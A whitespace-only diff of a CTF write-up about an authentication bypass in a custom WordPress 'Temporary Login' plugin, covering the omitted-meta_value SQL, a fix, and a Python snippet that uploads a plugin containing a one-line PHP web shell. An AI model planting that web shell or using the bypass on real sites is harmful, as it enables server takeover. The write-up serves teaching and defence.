@@ -2,9 +2,9 @@
 
 ## Challenge Overview
 
-- **Category:** Web  
-- **Difficulty:** Medium/Hard  
-- **Platform:** PolyU CTF  
+- **Category:** Web
+- **Difficulty:** Medium/Hard
+- **Platform:** PolyU CTF
 - **Challenge URL:** http://chal.polyuctf.com:42790
 
 The challenge involved finding a 0-day vulnerability in a custom WordPress plugin called "Temporary Login". The plugin was designed to create temporary, passwordless user access with a single click.
@@ -50,7 +50,7 @@ public static function maybe_login_temporary_user() {
     $token = sanitize_key( $_GET['temp-login-token'] );
 
     $user = Options::get_user_by_token( $token );
-    
+
     if ( ! $user || Options::is_user_expired( $user->ID ) ) {
         wp_safe_redirect( home_url() );
         die;
@@ -103,9 +103,9 @@ public static function get_user_by_token( $token ) {
 The generated SQL becomes:
 ```sql
 SELECT SQL_CALC_FOUND_ROWS wp_users.ID
-FROM wp_users 
+FROM wp_users
 INNER JOIN wp_usermeta ON (wp_users.ID = wp_usermeta.user_id)
-WHERE 1=1 
+WHERE 1=1
 AND (wp_usermeta.meta_key = '_temporary_login_token')
 -- meta_value constraint is completely omitted!
 ORDER BY user_login ASC
@@ -146,7 +146,7 @@ Since we're now authenticated as administrator, we can upload a plugin containin
 # Create malicious plugin ZIP
 zip_buffer = io.BytesIO()
 with zipfile.ZipFile(zip_buffer, "a") as zip_file:
-    zip_file.writestr("pwn/pwn.php", 
+    zip_file.writestr("pwn/pwn.php",
         "<?php system($_GET['cmd']); ?>")
 ```
 
@@ -186,10 +186,10 @@ PUCTF26{WordPress_bug_bounty_hunting_can_be_super_interesting_PjSJqQYZG9kr7DhE7d
 
 ## Vulnerability Summary
 
-**Type:** Authentication Bypass / Type Confusion  
-**Affected Component:** `Temporary Login` WordPress Plugin  
-**Root Cause:** WordPress `WP_User_Query` ignores empty `meta_value` parameters  
-**Attack Vector:** Array parameter injection with null/empty values  
+**Type:** Authentication Bypass / Type Confusion
+**Affected Component:** `Temporary Login` WordPress Plugin
+**Root Cause:** WordPress `WP_User_Query` ignores empty `meta_value` parameters
+**Attack Vector:** Array parameter injection with null/empty values
 
 ### CVSS Score: 9.8 (Critical)
 - **Attack Vector:** Network
@@ -222,12 +222,12 @@ To fix this vulnerability:
 ```php
 public static function maybe_login_temporary_user() {
     // Add type check
-    if ( ! isset( $_GET['temp-login-token'] ) || 
+    if ( ! isset( $_GET['temp-login-token'] ) ||
          ! is_string( $_GET['temp-login-token'] ) ||
          empty( $_GET['temp-login-token'] ) ) {
         return;
     }
-    
+
     // ... rest of the logic
 }
 ```
